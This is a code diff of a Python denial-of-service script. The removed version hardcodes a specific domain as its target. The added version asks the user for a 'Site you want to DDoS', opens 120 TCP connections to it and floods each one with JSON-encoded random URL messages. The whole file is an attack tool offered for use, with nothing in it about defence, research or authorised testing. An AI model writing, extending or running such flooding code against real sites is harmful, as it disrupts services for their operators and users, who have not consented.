@@ -1,40 +1,55 @@
+
+from helpers import get_random_url
+import json
 import socket
 
 
-def dos(host, ip):
-    # Creating a TCP socket
-    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    message = "Hello World"
-    # Using port 80 ( HTTP )
-    port = 80
+def attack_worker(ip_address, port, number_of_sockets, ):
+    try:
+        # Connection sockets list
+        sockets = []
+        # For each socket create one http connection
+        # Create the connection inside the for loop
+        for i in range(number_of_sockets):
+            ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            ddos.connect((ip_address, port))
 
-    # Attempting to connect to the host at the specified port
+            # Append the connection inside the sockets list
+            sockets.append(ddos)
 
-    # Connecting to the specified host and port
-    ddos.connect((host, port))
-    # Sending a message using different methods
-    ddos.send(message.encode())
-    ddos.sendto(message.encode(), (ip, port))
+        # Send the request from each socket connection
+        for ddos in sockets:
+            # Get the random headers and url
+            random_url = get_random_url()
+            message = json.dumps(random_url).encode()
+            ddos.send(message)
+            ddos.sendto(message, (ip_address, port))
+            ddos.send(message)
+
+        # Close the connection to cleanup
+        for conn_close in sockets:
+            try:
+                conn_close.close()
+            except:
+                pass  # silently ignore
+    except Exception as err:
+        print(err)
 
 
 def main():
-    print("DDoS Mode Loaded")
+    host = input("Site you want to DDoS:")
+    port = int(input("Enter port number:"))
 
-    host = "artma.io"
+    ip_address = socket.gethostbyname(host)
 
-    # Getting IP address of host
-    ip = socket.gethostbyname(host)
-    print("[" + ip + "]")
-    print("[ Ip is locked ]")
-    print("[ Attacking " + host + " ]")
+    # Default number of sockets
+    number_of_sockets = 120
 
-    print("+----------------------------+")
+    print("|| DDoS Loaded ||")
 
-    # Sending request on server
-    dos(host, ip)
-
-    print("+----------------------------+")
+    # Pass number of sockets
+    attack_worker(ip_address, port, number_of_sockets)
 
 
-# Call the main function to start the DDoS Attack
-main()
+if __name__ == "__main__":
+    main()
